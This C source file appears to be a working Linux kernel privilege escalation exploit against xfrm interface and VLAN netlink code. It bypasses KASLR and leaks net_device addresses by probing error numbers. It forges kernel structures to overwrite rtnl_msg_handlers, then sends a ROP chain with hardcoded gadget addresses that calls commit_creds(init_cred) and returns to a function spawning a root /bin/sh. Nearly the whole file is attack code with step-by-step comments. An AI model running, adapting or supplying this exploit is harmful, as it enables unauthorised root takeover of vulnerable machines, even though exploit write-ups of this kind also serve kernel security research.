#define _GNU_SOURCE
#include <features.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <errno.h>
#include <ctype.h>
#include <netdb.h>

#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/sysinfo.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <netlink/msg.h>
#include <netlink/attr.h>
#include <netlink/netlink.h>

#include "vlan_netlink.h"
#include "xfrm_netlink.h"
#include "gen.h"
#include "leak.h"
#define NUM_MSQIDS 4096*2
int error_num = 0;

unsigned long user_cs,user_ss,user_rsp,user_rflags;

void shell(void) {
        printf("ret2usr success! uid : %d\n",getuid());
        char *args[] = {"/bin/sh", "-i", NULL};
        execve(args[0], args, NULL);
}

static void save_state() {
        asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rsp),"=r" (user_rflags) : : "memory");
}


int nl_callback_get_error_num(struct nl_msg* recv_msg, void* arg)
{

    struct nlmsghdr * ret_hdr = nlmsg_hdr(recv_msg);

    if (ret_hdr->nlmsg_type == NLMSG_ERROR) {
        //printf("Received NLMSG_ERROR message!\n");
	struct nlmsgerr *errmsg = nlmsg_data(ret_hdr);
	error_num = errmsg->error;
        return NL_STOP;
    }
}

static int clr_flag(char *ifname, short flag)
{
        struct ifreq ifr;
        int fd,skfd;

        /* Create a channel to the NET kernel. */
        if ((skfd = socket(AF_INET,SOCK_DGRAM ,0)) < 0) {
                perror("socket");
                exit(1);
        }

        fd = skfd;

        strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
        if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) {
                fprintf(stderr, "%s: unknown interface: %s\n",
                                ifname, strerror(errno));
                return -1;
        }
        strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
        if(flag == 1)
                ifr.ifr_flags &= ~IFF_UP;
        else if(flag == 2)
                ifr.ifr_flags |= IFF_UP;
        if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) {
                perror("SIOCSIFFLAGS");
                return -1;
        }
        return (0);
}

int setup_sandbox(void) {
  
  if (unshare(CLONE_NEWUSER) < 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
    return -1;
  }
  
  if (unshare(CLONE_NEWNET) < 0) {
    perror("[-] unshare(CLONE_NEWNET)");
    return -1;
  }
  
}
void pin_on_cpu(int cpu) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(cpu, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    perror("sched_setaffinity()");
    exit(EXIT_FAILURE);
  }
  usleep(1000);
}

int main(void) {
    
    //char link2_name[9];
    //link2_name[8] = 0;
    /*
    char * message = malloc(0x1000);
    memset(message,0x41,0x1000);
    char * read_message = malloc(0x1000);
    memset(read_message, 0x41, 0x1000);
    int msqid[NUM_MSQIDS];
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
                perror("[-] msgget");
                return 0;
        }
    }
    */
    save_state();
    pin_on_cpu(0);
    if (setup_sandbox() < 0){
        printf("Create sandbox fail!\n");
        return 0;
    }

    clr_flag("lo",2);
    
    
    uint64_t kernel_off;
    //uint64_t kernel_off = bypass_kaslr(0);
    while(1){
    	uint64_t result1 = bypass_kaslr(0);
	if(result1>0xffff000000000000){
		sleep(1);
		continue;
	}
	sleep(1);
	uint64_t result2 = bypass_kaslr(0);
	
	if(result1==result2){
		kernel_off = result1;
		break;
	}
    }
    
    uint64_t base = bypass_kaslr2(0);
    
    //uint64_t kernel_off = 0;
    //uint64_t base = 0xffff888100000000;
    
    printf("Step 1 finish ! %llx %llx\n", kernel_off, base);
    
    //*(uint64_t *)link2_name = 0xffffffff8115df3e + kernel_off;//pop rsp; pop r15 ; ret
    
    struct nl_sock * socket = nl_socket_alloc();

    if(nl_connect(socket,NETLINK_ROUTE)<0){
    		printf("nfnl_connect fail!\n");
		return 0;
    }
    	
    create_xfrm_link_collect(socket, "test1");
    //create_vlan_link(socket, "vlan1");	
    
    
    change_xfrm_link(socket, "test1", 0x10);
    
    //create_xfrm_link_with_ifid(socket, link2_name, 0x101);
    create_xfrm_link_with_ifid(socket, "test2", 0x101);
    create_xfrm_link_with_ifid(socket, "test3", 0x102);
    create_xfrm_link_with_ifid(socket, "test4", 0x103);
    create_xfrm_link_with_ifid(socket, "test5", 0x104);
    delete_xfrm_link(socket, "test1");
    sleep(1);
    for (int i = 0; i < 0x10; i++){
	//printf("%d\n",i);
	char vlan_name[20];
    	pin_on_cpu(i%2);
	snprintf(vlan_name,20,"vlan%d",i);
	create_vlan_link(socket, vlan_name, 12, i);
    }

    printf("step 1 end\n");
    pin_on_cpu(0);
    
    printf("step2\n");
    uint64_t offset = 0x4a00000;//0x2800000;//0x4000000; //After debug
    uint64_t address_of_test2_dev = 0;
    uint64_t address_of_test3_dev = 0;
    uint64_t address_of_test4_dev = 0;
    nl_socket_modify_cb(socket,NL_CB_MSG_IN, NL_CB_CUSTOM, nl_callback_get_error_num, NULL);
    //find the address of `test2`->dev by error number because of the difference between -EEXIST and -EINVAL
    for (int i = 0; i < 0x3000; i++){
	for(int j = 0; j < 0x10; j++){
	    char vlan_name[20];
            snprintf(vlan_name,20,"vlan%d",j);	    
	    change_vlan_link_for_leak(socket, vlan_name, base + offset + i*0x1000);
	}
	if(address_of_test2_dev==0){
		change_xfrm_link(socket, "test2", 0x10);
		nl_recvmsgs_default(socket);
		printf("%d %d\n",i, error_num);
	
		if(error_num==-22){//if the error number is -EINVAL, it means we get the correct address of `test2`->dev
			address_of_test2_dev = base + offset + i*0x1000;
			printf("Get address of test2 dev : %llx\n", address_of_test2_dev);
			if(address_of_test3_dev!=0&&address_of_test4_dev!=0)
				break;
		}
	}
	
	if(address_of_test3_dev==0){
		change_xfrm_link(socket, "test3", 0x10);
                nl_recvmsgs_default(socket);
                printf("%d %d\n",i, error_num);

                if(error_num==-22){//if the error number is -EINVAL, it means we get the correct address of `test2`->dev
                        address_of_test3_dev = base + offset + i*0x1000;
                        printf("Get address of test3 dev : %llx\n", address_of_test3_dev);
                        change_xfrm_link(socket, "test3", 0x102);
			if(address_of_test2_dev!=0&&address_of_test4_dev!=0)
                                break;
                }
	}
	if(address_of_test4_dev==0){
                change_xfrm_link(socket, "test4", 0x10);
                nl_recvmsgs_default(socket);
                printf("%d %d\n",i, error_num);

                if(error_num==-22){//if the error number is -EINVAL, it means we get the correct address of `test2`->dev
                        address_of_test4_dev = base + offset + i*0x1000;
                        printf("Get address of test4 dev : %llx\n", address_of_test4_dev);
                        change_xfrm_link(socket, "test4", 0x103);
                        if(address_of_test2_dev!=0&&address_of_test3_dev!=0)
                                break;
                }
        }
	
    }
    
    
    if(address_of_test2_dev==0||address_of_test3_dev==0||address_of_test4_dev==0){
    	printf("Get address of test2 dev fail.\n");
	exit(0);
    }
    printf("Step 2 finish\n");
    printf("Step 3\n");
    //Here is how the code get struct xfrmi_net * for xfrm link -> net:
    //xfrmn = *(_QWORD *)(*(_QWORD *)(net_ptr + 0xAA0) + 8 * id_);
    //So we need two control memory : *(net_ptr + 0xAA0), and *(*(net_ptr+0xaa0) + 8 *0x2b)
    //Before we try to overwrite the ethtool_ops, we need a fake net->gen  and gen->ptr, so we need to delete the test3 and pad it again with other vlan link.
    delete_xfrm_link(socket, "test3");
    sleep(1);
    for (int i = 0x10; i < 0x20; i++){
        //printf("%d\n",i);
        char vlan_name[20];
        pin_on_cpu(i%2);
        snprintf(vlan_name,20,"vlan%d",i);
        create_vlan_link(socket, vlan_name, 11, i); // the test4 -> if_index is 11 after debugging.
    }
    pin_on_cpu(0);
    
    for (int i = 0x10; i < 0x20; i++){
        //printf("%d\n",i);
        char vlan_name[20];
        snprintf(vlan_name,20,"vlan%d",i);
        change_vlan_link_for_fake_net(socket, vlan_name, 
			address_of_test3_dev + 0x950 - 8*0x2b, //fake addr1, the net->gen ptr. Finally we get xfrmn from *(fake_addr1 + 8 * 0x2b). We build : *(fake_addr1 + 8 * 0x2b) == the address  of addr2.
	//		address_of_test4_dev + 0x200-0x1c*8); //fake addr2, fake struct xfrmi_net ptr, why +0x200-0x1c*8? because the offset(dev->ethtool_ops) is 0x200, and the hash of the (0x10) is 0x1c. So after setting this, we will finally overwrite the `test2 dev`->ethtool_ops
    			0xFFFFFFFF84BAB040 + kernel_off + 8 - 0x1c * 8); //fake addr2, fake struct xfrmi_net ptr, why 0xFFFFFFFF84BAB040 + off + 8 - 0x1c * 8? Because the address of &rtnl_msg_handlers[8] = 0xFFFFFFFF84BAB040 + 8 , and the hash of the (0x10) is 0x1c. So after setting this, we will finally overwrite the &rtnl_msg_handlers[8].
    }
    printf("Step 3 finish\n");
    
    printf("Step 4\n");
    
    //Now we try to overwrite the link2_name ->ethtool_ops
    for(int j = 0; j < 0x10; j++){
        char vlan_name[20];
        snprintf(vlan_name,20,"vlan%d",j);
        change_vlan_link_for_overwrite(socket, vlan_name, 
			address_of_test2_dev,    //fake xi->dev
			address_of_test3_dev + 0x948 - 0xaa0, //fake xi->net, 
			0x10 //fake xi->p.if_id
			);
    }
    printf("Step 4 finish\n");
    printf("Step 5\n");
    //All the work we do in step3 and step4 is trying to make struct xfrmi_net *xfrmn = net_generic(net, xfrmi_net_id) = address_of_test2_dev + 0x200-0x1c*8, so when we call xfrmi_link, we can overwrite struct net_device -> ethtool_ops.
    change_xfrm_link(socket, "test2", 0x10);
    printf("Step 5 finish\n");
    //Now we try to build a fake rtnl_msg_handlers[1]
    printf("Step 6\n");
    for (int i = 0; i < 0x10; i++){
    	char vlan_name[20];
        snprintf(vlan_name,20,"vlan%d",i);
	change_vlan_link_for_leak(socket, vlan_name,address_of_test3_dev + 0x948);//rtnl_msg_handlers[1][1]
    }
    
    for (int i = 0x10; i < 0x20; i++){
        char vlan_name[20];
        snprintf(vlan_name,20,"vlan%d",i);
        change_vlan_link_for_fake_rtnl_link(socket, vlan_name,0xffffffff81321cc8 + kernel_off);//rtnl_msg_handlers[1][1]->doit, 
											       //0xffffffff81321cc8 : leave ; pop rbx ; pop rbp ; mov eax, ecx ; pop r12 ; pop r13 ; ret
    }
    printf("Step 6 finish\n");
    printf("Step 7\n");
    //getchar();
    //Now we try to control RIP and jump to ROP
    struct nl_msg * msg = nlmsg_alloc();
    struct nlmsghdr *hdr1 = nlmsg_put(
            msg,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            1 + 16,   // TYPE, 1
            sizeof(struct ifinfomsg) + 0x100,
            NLM_F_REQUEST
    );
    struct ifinfomsg * h = malloc(sizeof(struct ifinfomsg) + 0x100);
    memset(h, 0, sizeof(struct ifinfomsg));
    h->ifi_family = 1;
    char * ops = &h[1];
    //Now we pad ROPgadget
    *(uint64_t *)&ops[0x08] = kernel_off + 0xffffffff8102932b;//pop rdi; ret
    *(uint64_t *)&ops[0x10] = kernel_off + 0xffffffff83c72ec0;//init_cred
    *(uint64_t *)&ops[0x18] = kernel_off + 0xffffffff811fc260;//commit_creds;
    *(uint64_t *)&ops[0x20] = kernel_off + 0xffffffff8102932b;//pop rdi ; ret
    *(uint64_t *)&ops[0x28] = 1;
    *(uint64_t *)&ops[0x30] = kernel_off + 0xffffffff811efe60;//find_task_by_vpid
    *(uint64_t *)&ops[0x38] = kernel_off + 0xffffffff8102932b;//pop rdi; ret
    *(uint64_t *)&ops[0x40] = 0;
    *(uint64_t *)&ops[0x48] = kernel_off + 0xffffffff81981535;//or rdi, rax ; test rdi, rdi ; setne al ; ret
    *(uint64_t *)&ops[0x50] = kernel_off + 0xffffffff811593be;//pop rsi ; ret
    *(uint64_t *)&ops[0x58] = kernel_off + 0xffffffff83c729e0;//init_nsproxy
    *(uint64_t *)&ops[0x60] = kernel_off + 0xffffffff811f9f60; //switch_task_namespaces
    *(uint64_t *)&ops[0x68] = kernel_off + 0xffffffff82468036;//swagpgs; ret
    *(uint64_t *)&ops[0x70] = kernel_off + 0xFFFFFFFF826011B7;//iretq
    *(uint64_t *)&ops[0x78] = (uint64_t)shell;
    *(uint64_t *)&ops[0x80] = user_cs;
    *(uint64_t *)&ops[0x88] = user_rflags;
    *(uint64_t *)&ops[0x90] = user_rsp;//|8;
    *(uint64_t *)&ops[0x98] = user_ss;
    
    memcpy(nlmsg_data(hdr1), h, sizeof(struct ifinfomsg) + 0x100);
    uint32_t total_size = NLMSG_ALIGN(hdr1->nlmsg_len);
    char *buf = malloc(total_size);
    memset(buf,0,total_size);
    memcpy(buf,hdr1,NLMSG_ALIGN(hdr1->nlmsg_len));
    int res = nl_sendto(socket, buf, total_size);
    
    return 0;
}
